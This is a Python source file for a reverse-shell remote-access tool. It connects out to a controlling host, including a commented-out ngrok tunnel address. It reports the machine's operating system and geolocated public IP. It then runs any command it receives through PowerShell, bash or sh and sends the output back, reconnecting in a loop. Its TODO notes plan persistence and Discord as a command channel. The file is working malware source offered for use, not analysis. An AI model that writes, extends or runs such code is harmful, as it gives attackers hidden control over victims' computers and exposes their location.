import os
import platform
import requests
import socket
import struct
import subprocess
import time

HEADER = 8

def check_internet():
    try:
        socket.setdefaulttimeout(2)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
        return True
    except:
        return False

def send(s, msg):
    msg = msg.encode()
    msg_length = len(msg)
    header = struct.pack("Q", msg_length)
    s.send(header + msg)

def recv(s):
    try:
        header = s.recv(HEADER)
        if not header:
            return
        msg_length = struct.unpack("Q", header)[0]
        msg = s.recv(msg_length)
        return msg.decode(errors="ignore", encoding="utf-8")
    except (ConnectionResetError, ConnectionError):
        print("Connection to the server was lost")
        s.close()
        return None

def execute_command(cmd):
    os_type = platform.system()
    if os_type == "Windows":
        cmd = ["powershell.exe", "-Command", cmd]
    elif os_type == "Linux":
        cmd = ["bash", "-c", cmd]
    elif os_type == "Darwin":
        cmd = ["sh", "-c", cmd]
    else:
        return "Unsupported operating system"

    process = subprocess.run(cmd, capture_output=True, shell=True)
    if process.returncode != 0:
        return process.stderr.decode(errors="ignore", encoding="utf-8")
    else:
        output = process.stdout.decode(errors="ignore", encoding="utf-8")
        if output.strip() == "":
            return "Command executed successfully and no output"
        return output

def geo_ip():
    try:
        ip = requests.get('http://ip-api.com/json/').json()['query']
        geo = requests.get(f'https://api.hackertarget.com/ipgeo/?q={ip}').text
        data = geo.split("\n")
        for line in data:
            if "Country" in line:
                country = line.split(":")[1].strip()
            elif "State" in line:
                state = line.split(":")[1].strip()
            elif "City" in line:
                city = line.split(":")[1].strip()
            return ip, country, state, city
    except Exception as e:
        ip, country, state, city = "Error", "Error", "Error", "Error"
        return ip, country, state, city
    


def reverse_shell(ip, port):
    while True:
        try:
            # Check for internet connection
            if not check_internet():
                print("No internet, reconnecting in 5 seconds...")
                time.sleep(5)
                continue

            ip_pub, country, state, city = geo_ip()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(None)
            s.connect((ip, port))
            send(s, platform.system())
            send(s, f"{ip_pub}-{country}-{state}-{city}")
            while True:
                cmd = recv(s)
                if cmd == "exit":
                    s.close()
                    return
                elif cmd.split(" ")[0] == "cd":
                    try:
                        # check existence 
                        if os.path.exists(cmd.split(" ")[1]):
                            os.chdir(os.path.expanduser(cmd.split(" ")[1]))
                            send(s, "Directory changed successfully")
                        else:
                            send(s, "Directory not found")
                    except FileNotFoundError as e:
                        send(s, str(e))
                else :
                    result = execute_command(cmd)
                    send(s, result)
        except socket.error as e:
            print("Lost connection to server, reconnecting in 5 seconds...")
            time.sleep(5)





if __name__ == "__main__":
    # ip = socket.getaddrinfo("5.tcp.eu.ngrok.io",11513)[0][4][0] # IP of the server
    ip = "127.0.0.1"
    port = 55555
    reverse_shell(ip, port)

# TODO : Handle no connection or dsconnection
# TODO : Multithreading
# TODO : Persistance
# TODO : use discord as C2
# TODO : same thing in C
